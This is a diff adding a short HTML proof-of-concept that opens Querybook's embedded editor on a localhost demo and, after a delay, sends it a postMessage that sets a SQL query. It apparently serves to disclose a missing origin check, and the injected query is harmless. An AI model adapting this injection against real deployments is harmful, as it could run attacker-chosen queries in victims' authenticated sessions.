@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>postMessage Injection PoC (window.open)</h1>
+
+  <button onclick="openAndInject()">Open Editor & Inject Query</button>
+
+  <script>
+    let qbWindow = null;
+
+    function openAndInject() {
+      // 1️⃣ Open Querybook in a top-level window (preserves session)
+      qbWindow = window.open(
+        "http://localhost:10001/demo_environment/_/embedded_editor/",
+        "querybook",
+        "width=1200,height=800"
+      );
+
+      if (!qbWindow) {
+        alert("Popup blocked");
+        return;
+      }
+
+      // 2️⃣ Wait briefly for the app to initialize
+      // (in real PoC, you may tune this or wait for a message back)
+      setTimeout(() => {
+        qbWindow.postMessage({
+          type: 'SET_QUERY',
+          value: "SELECT 'Injected via postMessage' AS impact;",
+          engine: "sqlite"
+        }, '*');
+      }, 3500);
+    }
+
+  </script>
+</body>
+</html>
